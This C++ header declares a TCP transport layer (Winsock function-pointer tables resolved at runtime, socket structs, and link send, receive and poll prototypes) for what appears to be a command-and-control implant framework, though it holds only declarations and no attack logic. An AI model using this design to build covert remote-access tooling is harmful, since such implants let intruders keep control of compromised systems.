#ifndef STARBURST_TRANSPORT_TCP_H
#define STARBURST_TRANSPORT_TCP_H

#include <common.h>

#define TCP_AF_INET         2
#define TCP_SOCK_STREAM     1
#define TCP_IPPROTO_TCP     6
#define TCP_FIONBIO         0x8004667EL
#define TCP_INVALID_SOCKET  (~(uintptr_t)0)
#define TCP_SOCKET_ERROR    (-1)
#define TCP_SOL_SOCKET      0xFFFF
#define TCP_SO_REUSEADDR    0x0004
#define TCP_SOMAXCONN       0x7FFFFFFF
#define TCP_MSG_PEEK        0x02
#define TCP_WSAEWOULDBLOCK  10035
#define TCP_RECV_BUF_MAX    0x10000

namespace starburst {

    using namespace stardust;

    typedef int       (__stdcall *tcp_fn_WSAStartup)( uint16_t, void* );
    typedef uintptr_t (__stdcall *tcp_fn_socket)( int, int, int );
    typedef int       (__stdcall *tcp_fn_connect)( uintptr_t, const void*, int );
    typedef int       (__stdcall *tcp_fn_send)( uintptr_t, const char*, int, int );
    typedef int       (__stdcall *tcp_fn_recv)( uintptr_t, char*, int, int );
    typedef int       (__stdcall *tcp_fn_closesocket)( uintptr_t );
    typedef int       (__stdcall *tcp_fn_select)( int, void*, void*, void*, const void* );
    typedef int       (__stdcall *tcp_fn_ioctlsocket)( uintptr_t, long, unsigned long* );
    typedef int       (__stdcall *tcp_fn_WSAGetLastError)( void );
    typedef int       (__stdcall *tcp_fn_WSACleanup)( void );
    typedef uint16_t  (__stdcall *tcp_fn_htons)( uint16_t );
    typedef uint16_t  (__stdcall *tcp_fn_ntohs)( uint16_t );
    typedef unsigned long (__stdcall *tcp_fn_inet_addr)( const char* );
    typedef int       (__stdcall *tcp_fn_bind)( uintptr_t, const void*, int );
    typedef int       (__stdcall *tcp_fn_listen)( uintptr_t, int );
    typedef uintptr_t (__stdcall *tcp_fn_accept)( uintptr_t, void*, int* );
    typedef int       (__stdcall *tcp_fn_setsockopt)( uintptr_t, int, int, const char*, int );

#pragma pack(push, 1)
    struct tcp_sockaddr_in {
        int16_t  sin_family;
        uint16_t sin_port;
        uint32_t sin_addr;
        char     sin_zero[8];
    };
#pragma pack(pop)

    struct tcp_fd_set {
        unsigned int fd_count;
        uintptr_t    fd_array[64];
    };

    struct tcp_timeval {
        long tv_sec;
        long tv_usec;
    };

    struct TcpWsApis {
        tcp_fn_WSAStartup       pWSAStartup;
        tcp_fn_socket           psocket;
        tcp_fn_connect          pconnect;
        tcp_fn_send             psend;
        tcp_fn_recv             precv;
        tcp_fn_closesocket      pclosesocket;
        tcp_fn_select           pselect;
        tcp_fn_ioctlsocket      pioctlsocket;
        tcp_fn_WSAGetLastError  pWSAGetLastError;
        tcp_fn_WSACleanup       pWSACleanup;
        tcp_fn_htons            phtons;
        tcp_fn_ntohs            pntohs;
        tcp_fn_inet_addr        pinet_addr;
        tcp_fn_bind             pbind;
        tcp_fn_listen           plisten;
        tcp_fn_accept           paccept;
        tcp_fn_setsockopt       psetsockopt;
    };

    struct TcpLinkState {
        TcpWsApis ws;
        HMODULE   h_ws2;
        bool      initialized;
    };

    auto declfn tcp_resolve_ws2(
        _Inout_ instance& inst,
        _Out_   TcpLinkState* state
    ) -> bool;

    auto declfn tcp_link_recv(
        _Inout_ instance& inst,
        _In_    TcpLinkState* ts,
        _In_    uintptr_t     sock,
        _Out_   uint8_t**     data,
        _Out_   uint32_t*     len
    ) -> bool;

    auto declfn tcp_link_send(
        _Inout_ instance& inst,
        _In_    TcpLinkState* ts,
        _In_    uintptr_t     sock,
        _In_    uint8_t*      data,
        _In_    uint32_t      len
    ) -> bool;

#if defined( INCLUDE_CMD_CONNECT ) || defined( INCLUDE_CMD_DISCONNECT ) || defined( TCP_TRANSPORT )
    auto declfn tcp_poll_links(
        _Inout_ instance& inst
    ) -> void;
    auto declfn tcp_link_send_msg(
        _Inout_ instance& inst,
        _In_    instance::TcpLink* link,
        _In_    uint8_t*           data,
        _In_    uint32_t           len
    ) -> bool;
#endif

#if defined( TCP_TRANSPORT )

    auto declfn tcp_init( instance& inst ) -> bool;
    auto declfn tcp_send( instance& inst, uint8_t* data, uint32_t len,
                          uint8_t** response, uint32_t* resp_len ) -> bool;
    auto declfn tcp_destroy( instance& inst ) -> void;

#endif

}

#endif
